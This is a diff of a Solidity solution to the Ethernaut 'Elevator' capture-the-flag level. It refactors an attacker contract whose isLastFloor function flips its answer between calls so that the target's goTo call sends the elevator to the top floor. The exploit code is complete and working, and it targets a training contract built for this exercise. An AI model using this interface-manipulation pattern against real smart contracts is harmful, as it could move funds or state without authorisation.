@@ -6,19 +6,27 @@ pragma solidity ^0.8.20;
  * @dev This elevator won't let you reach the top of your building. Right?
  */
 
-contract Ethernaut_Elevator {
-    bool private toogle;
-    address private elevator = 0xbEd2A62C26eC563e2499c4b9e47383995C6912B3; // Replace with your Elevator instance
+interface IElevator {
+    function goTo(uint256 _floor) external;
+}
 
-    // Implement the isLastFloor function to return false the first time (set the floor to any uint value) and true the second time to go to the top
+contract StairwayToHeaven {
+    bool private toogle;
+    IElevator private elevator;
+
+    constructor(address _elevator) {
+        elevator = IElevator(_elevator);
+    }
+
+    // Implement the isLastFloor function to return false the first time (set
+    // the floor to any uint value) and true the second time to go to the top
     function isLastFloor(uint) public returns (bool) {
         toogle = !toogle;
         return toogle;
     }
 
+    // Pick your number :)
     function attack(uint256 _floor) external {
-        Elevator(elevator).goTo(_floor);
+        elevator.goTo(_floor);
     }
 }
-
-// 🎉 Level completed! 🎉
